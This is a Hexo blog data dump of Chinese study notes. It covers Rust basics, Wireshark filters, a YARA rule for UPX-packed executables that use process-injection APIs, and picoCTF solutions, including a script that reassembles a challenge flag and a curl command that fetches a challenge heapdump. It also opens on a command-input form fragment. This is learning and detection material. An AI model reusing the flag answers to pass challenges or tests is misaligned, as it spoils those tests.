也就是cmd&#x3D;text</p>\n<pre><code>&lt;form&gt;&lt;/form&gt;\n&lt;input type=&quot;text&quot; name=&quot;cmd&quot; style=&quot;width:300px;&quot;&gt;\n</code></pre>\n"},{"title":"Rust基礎","date":"2025-06-01T16:52:31.000Z","_content":"\nRust 官方的開發流程是透過 cargo（等於 Rust 的專案管理工具 + 套件管理 + 編譯工具）來管理所有事情，\n所以不推薦直接透過RUST 編譯執行  建議使用cargo\n\n\n檢測全局版本\n\n    rustc --version\n    cargo --version\n\n\nRUST 使用hello world\n\n    fn main() {\n        println!(\"Hello, Rust!\");\n    }\n\n\nRUST 編譯執行\n\n    rustc main.rs\n    ./main\n\ncargo 建立專案\n\n    cargo new hello_rust\n    cd hello_rust\n    cargo run","source":"_posts/Rust基礎.md","raw":"---\ntitle: Rust基礎\ndate: 2025-06-02 00:52:31\ntags:\ncategories:\n  - 語言適應\n---\n\nRust 官方的開發流程是透過 cargo（等於 Rust 的專案管理工具 + 套件管理 + 編譯工具）來管理所有事情，\n所以不推薦直接透過RUST 編譯執行  建議使用cargo\n\n\n檢測全局版本\n\n    rustc --version\n    cargo --version\n\n\nRUST 使用hello world\n\n    fn main() {\n        println!(\"Hello, Rust!\");\n    }\n\n\nRUST 編譯執行\n\n    rustc main.rs\n    ./main\n\ncargo 建立專案\n\n    cargo new hello_rust\n    cd hello_rust\n    cargo run","slug":"Rust基礎","published":1,"updated":"2025-06-01T17:19:27.425Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwa50009zrlrg2u78a91","content":"<p>Rust 官方的開發流程是透過 cargo（等於 Rust 的專案管理工具 + 套件管理 + 編譯工具）來管理所有事情，<br>所以不推薦直接透過RUST 編譯執行  建議使用cargo</p>\n<p>檢測全局版本</p>\n<pre><code>rustc --version\ncargo --version\n</code></pre>\n<p>RUST 使用hello world</p>\n<pre><code>fn main() &#123;\n    println!(&quot;Hello, Rust!&quot;);\n&#125;\n</code></pre>\n<p>RUST 編譯執行</p>\n<pre><code>rustc main.rs\n./main\n</code></pre>\n<p>cargo 建立專案</p>\n<pre><code>cargo new hello_rust\ncd hello_rust\ncargo run\n</code></pre>\n","excerpt":"","more":"<p>Rust 官方的開發流程是透過 cargo（等於 Rust 的專案管理工具 + 套件管理 + 編譯工具）來管理所有事情，<br>所以不推薦直接透過RUST 編譯執行  建議使用cargo</p>\n<p>檢測全局版本</p>\n<pre><code>rustc --version\ncargo --version\n</code></pre>\n<p>RUST 使用hello world</p>\n<pre><code>fn main() &#123;\n    println!(&quot;Hello, Rust!&quot;);\n&#125;\n</code></pre>\n<p>RUST 編譯執行</p>\n<pre><code>rustc main.rs\n./main\n</code></pre>\n<p>cargo 建立專案</p>\n<pre><code>cargo new hello_rust\ncd hello_rust\ncargo run\n</code></pre>\n"},{"title":"Termshark & Wireshark","date":"2025-06-02T18:27:13.000Z","_content":"\nTermshark is a Text-based User Interface\n\nTermshark Help\n\n\nwireshark filter\nFTP-Request-Command Filter\n\n    ftp.requset.command\n\nftp-data\n\n    ftp-data\n\nhttp\n\n    http\n\n\ntcp.stream\n\n    tcp.stream eq 7","source":"_posts/Termshark Wireshark.md","raw":"---\ntitle: Termshark & Wireshark \ndate: 2025-06-03 02:27:13\ntags:\n---\n\nTermshark is a Text-based User Interface\n\nTermshark Help\n\n\nwireshark filter\nFTP-Request-Command Filter\n\n    ftp.requset.command\n\nftp-data\n\n    ftp-data\n\nhttp\n\n    http\n\n\ntcp.stream\n\n    tcp.stream eq 7","slug":"Termshark Wireshark","published":1,"updated":"2025-06-03T06:38:29.241Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwa6000azrlre7ki4uea","content":"<p>Termshark is a Text-based User Interface</p>\n<p>Termshark Help</p>\n<p>wireshark filter<br>FTP-Request-Command Filter</p>\n<pre><code>ftp.requset.command\n</code></pre>\n<p>ftp-data</p>\n<pre><code>ftp-data\n</code></pre>\n<p>http</p>\n<pre><code>http\n</code></pre>\n<p>tcp.stream</p>\n<pre><code>tcp.stream eq 7\n</code></pre>\n","excerpt":"","more":"<p>Termshark is a Text-based User Interface</p>\n<p>Termshark Help</p>\n<p>wireshark filter<br>FTP-Request-Command Filter</p>\n<pre><code>ftp.requset.command\n</code></pre>\n<p>ftp-data</p>\n<pre><code>ftp-data\n</code></pre>\n<p>http</p>\n<pre><code>http\n</code></pre>\n<p>tcp.stream</p>\n<pre><code>tcp.stream eq 7\n</code></pre>\n"},{"title":"YARA規則基礎","date":"2025-05-30T14:08:04.000Z","_content":"\n    rule AdvancedMaliciousUPXExecutable {\n        meta:\n            description = \"pico\"\n\n        strings:\n            $upx1 = \"UPX0\" ascii\n            $upx2 = \"UPX1\" ascii\n            $upx3 = \"UPX!\" ascii\n\n\n            $mal_str1 = \"Cr/p0\" ascii wide\n            $mal_str2 = \"3'+8U\" ascii wide\n            $mal_str3 = \"CHjM5\" ascii wide\n            $mal_str4 = \"t%j@\" ascii wide\n            $mal_str5 = \"l@Y2\" ascii wide\n            $mal_str6 = \"b3`5d5l5\" ascii wide\n            $mal_str7 = \"NtQueryInformationProcess\" ascii wide\n            // $mal_str8 = \"CreateProcessA\" ascii wide\n            // $mal_str9 = \"TerminateProcess\" ascii wide\n            $mal_str10 = \"DebugActiveProcess\" ascii wide\n            \n            //針對API\n            $api_critical1 = \"CreateToolhelp32Snapshot\" ascii\n            $api_critical2 = \"Process32FirstW\" ascii\n            $api_critical3 = \"Process32NextW\" ascii\n            $api_critical4 = \"VirtualAllocEx\" ascii\n            $api_critical5 = \"WriteProcessMemory\" ascii\n            $api_critical6 = \"SetThreadContext\" ascii\n            $api_critical7 = \"ResumeThread\" ascii\n\n            //針對16進制\n            $hex1 = { 25 64 64 64 6C 21 30 } // %dddl!0\n            $hex2 = { 62 33 60 35 64 35 6C 35 } // b3`5d5l5\n            $hex3 = { 6E 74 51 75 65 72 79 49 6E 66 6F 72 6D 61 74 69 6F 6E 50 72 6F 63 65 73 73 } // NtQueryInformationProcess\n            \n            // 針對特定名稱\n            $sect1 = \".text\" ascii\n            $sect2 = \".rdata\" ascii\n            $sect3 = \".data\" ascii\n            $sect4 = \".rsrc\" ascii\n            $sect5 = \".reloc\" ascii\n            $sect6 = \".upx\" ascii\n\n        condition:\n            uint16(0) == 0x5A4D and  // MZ 頭\n            filesize < 100MB and  // 檔案小於100MB\n            (\n\n                (\n                    (all of ($api_critical*)) and \n                    (1 of ($sect*))\n                ) or\n\n                (\n                    (1 of ($upx*) and 1 of ($mal_str*))\n                ) or\n\n\n                (\n                    2 of ($mal_str*)\n                ) or\n\n                (\n                    1 of ($hex*)\n                )\n            )\n    }\n","source":"_posts/YARA規則基礎.md","raw":"---\ntitle: YARA規則基礎\ndate: 2025-05-30 22:08:04\ntags:\ncategories:\n  - linux\n---\n\n    rule AdvancedMaliciousUPXExecutable {\n        meta:\n            description = \"pico\"\n\n        strings:\n            $upx1 = \"UPX0\" ascii\n            $upx2 = \"UPX1\" ascii\n            $upx3 = \"UPX!\" ascii\n\n\n            $mal_str1 = \"Cr/p0\" ascii wide\n            $mal_str2 = \"3'+8U\" ascii wide\n            $mal_str3 = \"CHjM5\" ascii wide\n            $mal_str4 = \"t%j@\" ascii wide\n            $mal_str5 = \"l@Y2\" ascii wide\n            $mal_str6 = \"b3`5d5l5\" ascii wide\n            $mal_str7 = \"NtQueryInformationProcess\" ascii wide\n            // $mal_str8 = \"CreateProcessA\" ascii wide\n            // $mal_str9 = \"TerminateProcess\" ascii wide\n            $mal_str10 = \"DebugActiveProcess\" ascii wide\n            \n            //針對API\n            $api_critical1 = \"CreateToolhelp32Snapshot\" ascii\n            $api_critical2 = \"Process32FirstW\" ascii\n            $api_critical3 = \"Process32NextW\" ascii\n            $api_critical4 = \"VirtualAllocEx\" ascii\n            $api_critical5 = \"WriteProcessMemory\" ascii\n            $api_critical6 = \"SetThreadContext\" ascii\n            $api_critical7 = \"ResumeThread\" ascii\n\n            //針對16進制\n            $hex1 = { 25 64 64 64 6C 21 30 } // %dddl!0\n            $hex2 = { 62 33 60 35 64 35 6C 35 } // b3`5d5l5\n            $hex3 = { 6E 74 51 75 65 72 79 49 6E 66 6F 72 6D 61 74 69 6F 6E 50 72 6F 63 65 73 73 } // NtQueryInformationProcess\n            \n            // 針對特定名稱\n            $sect1 = \".text\" ascii\n            $sect2 = \".rdata\" ascii\n            $sect3 = \".data\" ascii\n            $sect4 = \".rsrc\" ascii\n            $sect5 = \".reloc\" ascii\n            $sect6 = \".upx\" ascii\n\n        condition:\n            uint16(0) == 0x5A4D and  // MZ 頭\n            filesize < 100MB and  // 檔案小於100MB\n            (\n\n                (\n                    (all of ($api_critical*)) and \n                    (1 of ($sect*))\n                ) or\n\n                (\n                    (1 of ($upx*) and 1 of ($mal_str*))\n                ) or\n\n\n                (\n                    2 of ($mal_str*)\n                ) or\n\n                (\n                    1 of ($hex*)\n                )\n            )\n    }\n","slug":"YARA規則基礎","published":1,"updated":"2025-06-01T17:21:18.093Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwa6000czrlrbbikb6mm","content":"<pre><code>rule AdvancedMaliciousUPXExecutable &#123;\n    meta:\n        description = &quot;pico&quot;\n\n    strings:\n        $upx1 = &quot;UPX0&quot; ascii\n        $upx2 = &quot;UPX1&quot; ascii\n        $upx3 = &quot;UPX!&quot; ascii\n\n\n        $mal_str1 = &quot;Cr/p0&quot; ascii wide\n        $mal_str2 = &quot;3&#39;+8U&quot; ascii wide\n        $mal_str3 = &quot;CHjM5&quot; ascii wide\n        $mal_str4 = &quot;t%j@&quot; ascii wide\n        $mal_str5 = &quot;l@Y2&quot; ascii wide\n        $mal_str6 = &quot;b3`5d5l5&quot; ascii wide\n        $mal_str7 = &quot;NtQueryInformationProcess&quot; ascii wide\n        // $mal_str8 = &quot;CreateProcessA&quot; ascii wide\n        // $mal_str9 = &quot;TerminateProcess&quot; ascii wide\n        $mal_str10 = &quot;DebugActiveProcess&quot; ascii wide\n        \n        //針對API\n        $api_critical1 = &quot;CreateToolhelp32Snapshot&quot; ascii\n        $api_critical2 = &quot;Process32FirstW&quot; ascii\n        $api_critical3 = &quot;Process32NextW&quot; ascii\n        $api_critical4 = &quot;VirtualAllocEx&quot; ascii\n        $api_critical5 = &quot;WriteProcessMemory&quot; ascii\n        $api_critical6 = &quot;SetThreadContext&quot; ascii\n        $api_critical7 = &quot;ResumeThread&quot; ascii\n\n        //針對16進制\n        $hex1 = &#123; 25 64 64 64 6C 21 30 &#125; // %dddl!0\n        $hex2 = &#123; 62 33 60 35 64 35 6C 35 &#125; // b3`5d5l5\n        $hex3 = &#123; 6E 74 51 75 65 72 79 49 6E 66 6F 72 6D 61 74 69 6F 6E 50 72 6F 63 65 73 73 &#125; // NtQueryInformationProcess\n        \n        // 針對特定名稱\n        $sect1 = &quot;.text&quot; ascii\n        $sect2 = &quot;.rdata&quot; ascii\n        $sect3 = &quot;.data&quot; ascii\n        $sect4 = &quot;.rsrc&quot; ascii\n        $sect5 = &quot;.reloc&quot; ascii\n        $sect6 = &quot;.upx&quot; ascii\n\n    condition:\n        uint16(0) == 0x5A4D and  // MZ 頭\n        filesize &lt; 100MB and  // 檔案小於100MB\n        (\n\n            (\n                (all of ($api_critical*)) and \n                (1 of ($sect*))\n            ) or\n\n            (\n                (1 of ($upx*) and 1 of ($mal_str*))\n            ) or\n\n\n            (\n                2 of ($mal_str*)\n            ) or\n\n            (\n                1 of ($hex*)\n            )\n        )\n&#125;\n</code></pre>\n","excerpt":"","more":"<pre><code>rule AdvancedMaliciousUPXExecutable &#123;\n    meta:\n        description = &quot;pico&quot;\n\n    strings:\n        $upx1 = &quot;UPX0&quot; ascii\n        $upx2 = &quot;UPX1&quot; ascii\n        $upx3 = &quot;UPX!&quot; ascii\n\n\n        $mal_str1 = &quot;Cr/p0&quot; ascii wide\n        $mal_str2 = &quot;3&#39;+8U&quot; ascii wide\n        $mal_str3 = &quot;CHjM5&quot; ascii wide\n        $mal_str4 = &quot;t%j@&quot; ascii wide\n        $mal_str5 = &quot;l@Y2&quot; ascii wide\n        $mal_str6 = &quot;b3`5d5l5&quot; ascii wide\n        $mal_str7 = &quot;NtQueryInformationProcess&quot; ascii wide\n        // $mal_str8 = &quot;CreateProcessA&quot; ascii wide\n        // $mal_str9 = &quot;TerminateProcess&quot; ascii wide\n        $mal_str10 = &quot;DebugActiveProcess&quot; ascii wide\n        \n        //針對API\n        $api_critical1 = &quot;CreateToolhelp32Snapshot&quot; ascii\n        $api_critical2 = &quot;Process32FirstW&quot; ascii\n        $api_critical3 = &quot;Process32NextW&quot; ascii\n        $api_critical4 = &quot;VirtualAllocEx&quot; ascii\n        $api_critical5 = &quot;WriteProcessMemory&quot; ascii\n        $api_critical6 = &quot;SetThreadContext&quot; ascii\n        $api_critical7 = &quot;ResumeThread&quot; ascii\n\n        //針對16進制\n        $hex1 = &#123; 25 64 64 64 6C 21 30 &#125; // %dddl!0\n        $hex2 = &#123; 62 33 60 35 64 35 6C 35 &#125; // b3`5d5l5\n        $hex3 = &#123; 6E 74 51 75 65 72 79 49 6E 66 6F 72 6D 61 74 69 6F 6E 50 72 6F 63 65 73 73 &#125; // NtQueryInformationProcess\n        \n        // 針對特定名稱\n        $sect1 = &quot;.text&quot; ascii\n        $sect2 = &quot;.rdata&quot; ascii\n        $sect3 = &quot;.data&quot; ascii\n        $sect4 = &quot;.rsrc&quot; ascii\n        $sect5 = &quot;.reloc&quot; ascii\n        $sect6 = &quot;.upx&quot; ascii\n\n    condition:\n        uint16(0) == 0x5A4D and  // MZ 頭\n        filesize &lt; 100MB and  // 檔案小於100MB\n        (\n\n            (\n                (all of ($api_critical*)) and \n                (1 of ($sect*))\n            ) or\n\n            (\n                (1 of ($upx*) and 1 of ($mal_str*))\n            ) or\n\n\n            (\n                2 of ($mal_str*)\n            ) or\n\n            (\n                1 of ($hex*)\n            )\n        )\n&#125;\n</code></pre>\n"},{"title":"apk逆向基礎","date":"2025-05-30T12:26:37.000Z","_content":"\n\nAndroid Stadio的Logcat監聽手機\njadx開啟目標應用 全為java語言 特徵  每個檔案只能有一個類  類與檔案名相同\n\nR.string.password代表 res/values/string.xml/password\n條件運算子（? :）\n\n    public class FlagstaffHill {\n        public static native String fenugreek(String str);\n        public static String getFlag(String input, Context ctx) {\n            String password = ctx.getString(R.string.password);\n            return input.equals(password) ? fenugreek(input) : \"NOPE\";\n        }\n    }\n","source":"_posts/apk逆向基礎.md","raw":"---\ntitle: apk逆向基礎\ndate: 2025-05-30 20:26:37\ntags:\n---\n\n\nAndroid Stadio的Logcat監聽手機\njadx開啟目標應用 全為java語言 特徵  每個檔案只能有一個類  類與檔案名相同\n\nR.string.password代表 res/values/string.xml/password\n條件運算子（? :）\n\n    public class FlagstaffHill {\n        public static native String fenugreek(String str);\n        public static String getFlag(String input, Context ctx) {\n            String password = ctx.getString(R.string.password);\n            return input.equals(password) ? fenugreek(input) : \"NOPE\";\n        }\n    }\n","slug":"apk逆向基礎","published":1,"updated":"2025-05-30T12:54:56.807Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwa7000dzrlr2c4x1ska","content":"<p>Android Stadio的Logcat監聽手機<br>jadx開啟目標應用 全為java語言 特徵  每個檔案只能有一個類  類與檔案名相同</p>\n<p>R.string.password代表 res&#x2F;values&#x2F;string.xml&#x2F;password<br>條件運算子（? :）</p>\n<pre><code>public class FlagstaffHill &#123;\n    public static native String fenugreek(String str);\n    public static String getFlag(String input, Context ctx) &#123;\n        String password = ctx.getString(R.string.password);\n        return input.equals(password) ? fenugreek(input) : &quot;NOPE&quot;;\n    &#125;\n&#125;\n</code></pre>\n","excerpt":"","more":"<p>Android Stadio的Logcat監聽手機<br>jadx開啟目標應用 全為java語言 特徵  每個檔案只能有一個類  類與檔案名相同</p>\n<p>R.string.password代表 res&#x2F;values&#x2F;string.xml&#x2F;password<br>條件運算子（? :）</p>\n<pre><code>public class FlagstaffHill &#123;\n    public static native String fenugreek(String str);\n    public static String getFlag(String input, Context ctx) &#123;\n        String password = ctx.getString(R.string.password);\n        return input.equals(password) ? fenugreek(input) : &quot;NOPE&quot;;\n    &#125;\n&#125;\n</code></pre>\n"},{"title":"chrome console","date":"2025-05-30T12:26:37.000Z","_content":"\n先定義一個表scrambledSegments\n再定義一個地圖orderMap\n再定義一個方法restorePassword\n\n    const scrambledSegments = [\n    'lz_b',\n    'no_c',\n    'CTF{',\n    'pico',\n    '706c',\n    '5}',\n    'ts_p',\n    'lien',\n    ];\n\n    const orderMap = [3, 2, 1, 7, 6, 0, 4, 5];\n\n    function restorePassword(scrambled, order) {\n    let result = '';\n    for (let i = 0; i < order.length; i++) {\n        result += scrambled[order[i]];\n    }\n    return result;\n    }\n\n    const recovered = restorePassword(scrambledSegments, orderMap);\n    console.log('還原密碼:', recovered);\n","source":"_posts/chrome console.md","raw":"---\ntitle: chrome console\ndate: 2025-05-30 20:26:37\ntags:\n---\n\n先定義一個表scrambledSegments\n再定義一個地圖orderMap\n再定義一個方法restorePassword\n\n    const scrambledSegments = [\n    'lz_b',\n    'no_c',\n    'CTF{',\n    'pico',\n    '706c',\n    '5}',\n    'ts_p',\n    'lien',\n    ];\n\n    const orderMap = [3, 2, 1, 7, 6, 0, 4, 5];\n\n    function restorePassword(scrambled, order) {\n    let result = '';\n    for (let i = 0; i < order.length; i++) {\n        result += scrambled[order[i]];\n    }\n    return result;\n    }\n\n    const recovered = restorePassword(scrambledSegments, orderMap);\n    console.log('還原密碼:', recovered);\n","slug":"chrome console","published":1,"updated":"2025-06-02T16:46:44.534Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwa7000gzrlr6lfwg2vy","content":"<p>先定義一個表scrambledSegments<br>再定義一個地圖orderMap<br>再定義一個方法restorePassword</p>\n<pre><code>const scrambledSegments = [\n&#39;lz_b&#39;,\n&#39;no_c&#39;,\n&#39;CTF&#123;&#39;,\n&#39;pico&#39;,\n&#39;706c&#39;,\n&#39;5&#125;&#39;,\n&#39;ts_p&#39;,\n&#39;lien&#39;,\n];\n\nconst orderMap = [3, 2, 1, 7, 6, 0, 4, 5];\n\nfunction restorePassword(scrambled, order) &#123;\nlet result = &#39;&#39;;\nfor (let i = 0; i &lt; order.length; i++) &#123;\n    result += scrambled[order[i]];\n&#125;\nreturn result;\n&#125;\n\nconst recovered = restorePassword(scrambledSegments, orderMap);\nconsole.log(&#39;還原密碼:&#39;, recovered);\n</code></pre>\n","excerpt":"","more":"<p>先定義一個表scrambledSegments<br>再定義一個地圖orderMap<br>再定義一個方法restorePassword</p>\n<pre><code>const scrambledSegments = [\n&#39;lz_b&#39;,\n&#39;no_c&#39;,\n&#39;CTF&#123;&#39;,\n&#39;pico&#39;,\n&#39;706c&#39;,\n&#39;5&#125;&#39;,\n&#39;ts_p&#39;,\n&#39;lien&#39;,\n];\n\nconst orderMap = [3, 2, 1, 7, 6, 0, 4, 5];\n\nfunction restorePassword(scrambled, order) &#123;\nlet result = &#39;&#39;;\nfor (let i = 0; i &lt; order.length; i++) &#123;\n    result += scrambled[order[i]];\n&#125;\nreturn result;\n&#125;\n\nconst recovered = restorePassword(scrambledSegments, orderMap);\nconsole.log(&#39;還原密碼:&#39;, recovered);\n</code></pre>\n"},{"title":"TCP 硬基礎","date":"2025-06-03T12:26:37.000Z","_content":"\n\n\n\n\n\nTCP three-Way Handshake\n\n| Step    | Direction       | What’s Sent                                          | Function                                                      |\n| ------ | ---------- | ----------------- | --------------- |\n| SYN     | Client → Server | I want to connect, here’s my sequence number         | Tells the server: I want to connect, get ready.               |\n| SYN+ACK | Server → Client | I accept, here’s my sequence number, and I got yours | Server says: OK, I’m ready too, and I received your request.  |\n| ACK     | Client → Server | I received your sequence number                      | Client confirms: Got it, we’re both ready, let’s communicate. |\n\n\n\n\n\nHTTPS (Hypertext Transfer Protocol Secure) includes the standard TCP three-way handshake as part of its connection process.\n\nAfter the TCP connection is established, HTTPS initiates a TLS handshake to provide encryption and secure communication.\n\nHTTP (Hypertext Transfer Protocol) also uses the TCP three-way handshake, but does not include any encryption.\n\n\n\n\n![網路層](/image/lay.jpg)\n\n\n\n\n\n","source":"_posts/TCP 硬基礎.md","raw":"---\ntitle: TCP 硬基礎\ndate: 2025-06-3 20:26:37\ntags:\n---\n\n\n\n\n\n\nTCP three-Way Handshake\n\n| Step    | Direction       | What’s Sent                                          | Function                                                      |\n| ------ | ---------- | ----------------- | --------------- |\n| SYN     | Client → Server | I want to connect, here’s my sequence number         | Tells the server: I want to connect, get ready.               |\n| SYN+ACK | Server → Client | I accept, here’s my sequence number, and I got yours | Server says: OK, I’m ready too, and I received your request.  |\n| ACK     | Client → Server | I received your sequence number                      | Client confirms: Got it, we’re both ready, let’s communicate. |\n\n\n\n\n\nHTTPS (Hypertext Transfer Protocol Secure) includes the standard TCP three-way handshake as part of its connection process.\n\nAfter the TCP connection is established, HTTPS initiates a TLS handshake to provide encryption and secure communication.\n\nHTTP (Hypertext Transfer Protocol) also uses the TCP three-way handshake, but does not include any encryption.\n\n\n\n\n![網路層](/image/lay.jpg)\n\n\n\n\n\n","slug":"TCP 硬基礎","published":1,"updated":"2025-06-04T10:42:24.720Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwa8000izrlr4svx3sdc","content":"<p>TCP three-Way Handshake</p>\n<table>\n<thead>\n<tr>\n<th>Step</th>\n<th>Direction</th>\n<th>What’s Sent</th>\n<th>Function</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>SYN</td>\n<td>Client → Server</td>\n<td>I want to connect, here’s my sequence number</td>\n<td>Tells the server: I want to connect, get ready.</td>\n</tr>\n<tr>\n<td>SYN+ACK</td>\n<td>Server → Client</td>\n<td>I accept, here’s my sequence number, and I got yours</td>\n<td>Server says: OK, I’m ready too, and I received your request.</td>\n</tr>\n<tr>\n<td>ACK</td>\n<td>Client → Server</td>\n<td>I received your sequence number</td>\n<td>Client confirms: Got it, we’re both ready, let’s communicate.</td>\n</tr>\n</tbody></table>\n<p>HTTPS (Hypertext Transfer Protocol Secure) includes the standard TCP three-way handshake as part of its connection process.</p>\n<p>After the TCP connection is established, HTTPS initiates a TLS handshake to provide encryption and secure communication.</p>\n<p>HTTP (Hypertext Transfer Protocol) also uses the TCP three-way handshake, but does not include any encryption.</p>\n<p><img src=\"/image/lay.jpg\" alt=\"網路層\"></p>\n","excerpt":"","more":"<p>TCP three-Way Handshake</p>\n<table>\n<thead>\n<tr>\n<th>Step</th>\n<th>Direction</th>\n<th>What’s Sent</th>\n<th>Function</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>SYN</td>\n<td>Client → Server</td>\n<td>I want to connect, here’s my sequence number</td>\n<td>Tells the server: I want to connect, get ready.</td>\n</tr>\n<tr>\n<td>SYN+ACK</td>\n<td>Server → Client</td>\n<td>I accept, here’s my sequence number, and I got yours</td>\n<td>Server says: OK, I’m ready too, and I received your request.</td>\n</tr>\n<tr>\n<td>ACK</td>\n<td>Client → Server</td>\n<td>I received your sequence number</td>\n<td>Client confirms: Got it, we’re both ready, let’s communicate.</td>\n</tr>\n</tbody></table>\n<p>HTTPS (Hypertext Transfer Protocol Secure) includes the standard TCP three-way handshake as part of its connection process.</p>\n<p>After the TCP connection is established, HTTPS initiates a TLS handshake to provide encryption and secure communication.</p>\n<p>HTTP (Hypertext Transfer Protocol) also uses the TCP three-way handshake, but does not include any encryption.</p>\n<p><img src=\"/image/lay.jpg\" alt=\"網路層\"></p>\n"},{"title":"curl基礎","date":"2025-06-02T07:02:18.000Z","_content":"\ncurl 發送https請求 \n-O是下載\n\n    curl -O -X 'GET' \\\n    'http://verbal-sleep.picoctf.net:49884/heapdump' \\\n    -H 'accept: */*'\n\n| 參數             | 說明                               |\n| -------------- | -------------------------------- |\n| `-X`           | 指定 HTTP 方法（如 `GET`、`POST`、`PUT`） |\n| `-o [檔名]`      | 將下載內容儲存為指定檔案                     |\n| `-O`           | 以原始檔名儲存下載內容                      |\n| `-d`           | 傳送 POST/PUT 表單資料（`key=value`）    |\n| `-H`           | 加入自訂 HTTP 標頭（Header）             |\n| `-u`           | HTTP Basic 認證（`user:pass`）       |\n| `-F`           | 表單格式上傳檔案（`-F \"file=@檔案\"`）        |\n| `-v`           | 顯示詳細傳輸過程（verbose 模式）             |\n| `-k`           | 忽略 HTTPS 憑證錯誤                    |\n| `-I`           | 只抓 HTTP Response Header          |\n| `-L`           | 自動跟隨 HTTP 轉址（redirect）           |\n| `-b`           | 傳送 Cookie（可接字串或 cookie 檔）        |\n| `-c`           | 將 Cookie 儲存至檔案                   |\n| `--cookie`     | 同 `-b`，傳送 cookie 字串              |\n| `--resolve`    | 自訂 DNS 解析（格式：`host:port:IP`）     |\n| `--limit-rate` | 限制傳輸速率（如：`100k`、`1m`）            |\n| `--retry`      | 請求失敗時自動重試次數                      |\n| `--socks5`     | 使用 SOCKS5 Proxy                  |\n| `-x`           | 使用 HTTP Proxy（注意是小寫）             |\n| `--max-time`   | 最長請求時間（秒）                        |\n| `--trace`      | 輸出詳細除錯 trace 到檔案                 |\n| `-X DELETE`    | 指定 HTTP 方法為 `DELETE`，用於刪除資源 |\n| `-k `          | 忽略 SSL 憑證錯誤                            |\n| `--cert cert.pem --key key.pem`   | 使用客戶端憑證連線 |\n","source":"_posts/curl基礎.md","raw":"---\ntitle: curl基礎\ndate: 2025-06-02 15:02:18\ntags:\n---\n\ncurl 發送https請求 \n-O是下載\n\n    curl -O -X 'GET' \\\n    'http://verbal-sleep.picoctf.net:49884/heapdump' \\\n    -H 'accept: */*'\n\n| 參數             | 說明                               |\n| -------------- | -------------------------------- |\n| `-X`           | 指定 HTTP 方法（如 `GET`、`POST`、`PUT`） |\n| `-o [檔名]`      | 將下載內容儲存為指定檔案                     |\n| `-O`           | 以原始檔名儲存下載內容                      |\n| `-d`           | 傳送 POST/PUT 表單資料（`key=value`）    |\n| `-H`           | 加入自訂 HTTP 標頭（Header）             |\n| `-u`           | HTTP Basic 認證（`user:pass`）       |\n| `-F`           | 表單格式上傳檔案（`-F \"file=@檔案\"`）        |\n| `-v`           | 顯示詳細傳輸過程（verbose 模式）             |\n| `-k`           | 忽略 HTTPS 憑證錯誤                    |\n| `-I`           | 只抓 HTTP Response Header          |\n| `-L`           | 自動跟隨 HTTP 轉址（redirect）           |\n| `-b`           | 傳送 Cookie（可接字串或 cookie 檔）        |\n| `-c`           | 將 Cookie 儲存至檔案                   |\n| `--cookie`     | 同 `-b`，傳送 cookie 字串              |\n| `--resolve`    | 自訂 DNS 解析（格式：`host:port:IP`）     |\n| `--limit-rate` | 限制傳輸速率（如：`100k`、`1m`）            |\n| `--retry`      | 請求失敗時自動重試次數                      |\n| `--socks5`     | 使用 SOCKS5 Proxy                  |\n| `-x`           | 使用 HTTP Proxy（注意是小寫）             |\n| `--max-time`   | 最長請求時間（秒）                        |\n| `--trace`      | 輸出詳細除錯 trace 到檔案                 |\n| `-X DELETE`    | 指定 HTTP 方法為 `DELETE`，用於刪除資源 |\n| `-k `          | 忽略 SSL 憑證錯誤                            |\n| `--cert cert.pem --key key.pem`   | 使用客戶端憑證連線 |\n","slug":"curl基礎","published":1,"updated":"2025-06-02T11:40:02.024Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwa8000jzrlrekqd279v","content":"<p>curl 發送https請求<br>-O是下載</p>\n<pre><code>curl -O -X &#39;GET&#39; \\\n&#39;http://verbal-sleep.picoctf.net:49884/heapdump&#39; \\\n-H &#39;accept: */*&#39;\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>參數</th>\n<th>說明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>-X</code></td>\n<td>指定 HTTP 方法（如 <code>GET</code>、<code>POST</code>、<code>PUT</code>）</td>\n</tr>\n<tr>\n<td><code>-o [檔名]</code></td>\n<td>將下載內容儲存為指定檔案</td>\n</tr>\n<tr>\n<td><code>-O</code></td>\n<td>以原始檔名儲存下載內容</td>\n</tr>\n<tr>\n<td><code>-d</code></td>\n<td>傳送 POST&#x2F;PUT 表單資料（<code>key=value</code>）</td>\n</tr>\n<tr>\n<td><code>-H</code></td>\n<td>加入自訂 HTTP 標頭（Header）</td>\n</tr>\n<tr>\n<td><code>-u</code></td>\n<td>HTTP Basic 認證（<code>user:pass</code>）</td>\n</tr>\n<tr>\n<td><code>-F</code></td>\n<td>表單格式上傳檔案（<code>-F &quot;file=@檔案&quot;</code>）</td>\n</tr>\n<tr>\n<td><code>-v</code></td>\n<td>顯示詳細傳輸過程（verbose 模式）</td>\n</tr>\n<tr>\n<td><code>-k</code></td>\n<td>忽略 HTTPS 憑證錯誤</td>\n</tr>\n<tr>\n<td><code>-I</code></td>\n<td>只抓 HTTP Response Header</td>\n</tr>\n<tr>\n<td><code>-L</code></td>\n<td>自動跟隨 HTTP 轉址（redirect）</td>\n</tr>\n<tr>\n<td><code>-b</code></td>\n<td>傳送 Cookie（可接字串或 cookie 檔）</td>\n</tr>\n<tr>\n<td><code>-c</code></td>\n<td>將 Cookie 儲存至檔案</td>\n</tr>\n<tr>\n<td><code>--cookie</code></td>\n<td>同 <code>-b</code>，傳送 cookie 字串</td>\n</tr>\n<tr>\n<td><code>--resolve</code></td>\n<td>自訂 DNS 解析（格式：<code>host:port:IP</code>）</td>\n</tr>\n<tr>\n<td><code>--limit-rate</code></td>\n<td>限制傳輸速率（如：<code>100k</code>、<code>1m</code>）</td>\n</tr>\n<tr>\n<td><code>--retry</code></td>\n<td>請求失敗時自動重試次數</td>\n</tr>\n<tr>\n<td><code>--socks5</code></td>\n<td>使用 SOCKS5 Proxy</td>\n</tr>\n<tr>\n<td><code>-x</code></td>\n<td>使用 HTTP 